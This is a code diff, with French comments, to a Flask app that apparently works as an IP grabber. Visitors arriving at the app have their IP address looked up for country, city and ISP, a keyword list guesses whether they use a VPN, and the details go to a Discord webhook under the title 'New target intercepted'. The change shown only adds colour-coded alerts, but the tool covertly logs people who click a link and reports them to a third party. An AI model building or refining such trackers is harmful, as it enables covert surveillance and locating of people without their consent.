@@ -7,15 +7,20 @@ app = Flask(__name__)
 # --- CONFIGURATION ---
 WEBHOOK_URL = "WEBHOOK" # Remplace par ton vrai lien !
 TARGET_URL = "TARGET"
-EMBED_COLOR = 16711680 # Couleur rouge en format décimal
+
+# Couleurs en décimal pour Discord
+COLOR_RED = 16711680   # Probable VPN/Proxy
+COLOR_GREEN = 65280    # Résidentiel/Mobile
+COLOR_YELLOW = 16776960 # Erreur/Inconnu
 
 def get_ip_info(ip):
-    """Interroge une API gratuite et renvoie un dictionnaire avec les infos"""
+    """Interroge une API gratuite et renvoie un dictionnaire avec les infos et la couleur de l'embed"""
     info = {
         "country": "Inconnu",
         "city": "Inconnue",
         "isp": "Inconnu",
-        "vpn_status": "⚠️ Analyse impossible"
+        "vpn_status": "⚠️ Analyse impossible",
+        "embed_color": COLOR_YELLOW # Couleur par défaut en cas d'erreur
     }
     
     try:
@@ -31,7 +36,12 @@ def get_ip_info(ip):
             vpn_keywords = ['vpn', 'hosting', 'datacenter', 'cloud', 'm247', 'ovh', 'digitalocean', 'amazon', 'google', 'hetzner']
             is_vpn = any(keyword in info["isp"].lower() for keyword in vpn_keywords)
             
-            info["vpn_status"] = "🔴 Probable VPN / Proxy / Serveur" if is_vpn else "🟢 Connexion Résidentielle / Mobile"
+            if is_vpn:
+                info["vpn_status"] = "🔴 Probable VPN / Proxy / Serveur"
+                info["embed_color"] = COLOR_RED
+            else:
+                info["vpn_status"] = "🟢 Connexion Résidentielle / Mobile"
+                info["embed_color"] = COLOR_GREEN
             
     except Exception:
         pass
@@ -69,7 +79,7 @@ def index():
         "embeds": [
             {
                 "title": "🎯 Nouvelle Cible Interceptée",
-                "color": EMBED_COLOR,
+                "color": ip_data["embed_color"], # Utilisation de la couleur déterminée dynamiquement
                 "fields": [
                     {
                         "name": "🌐 Adresse IP",
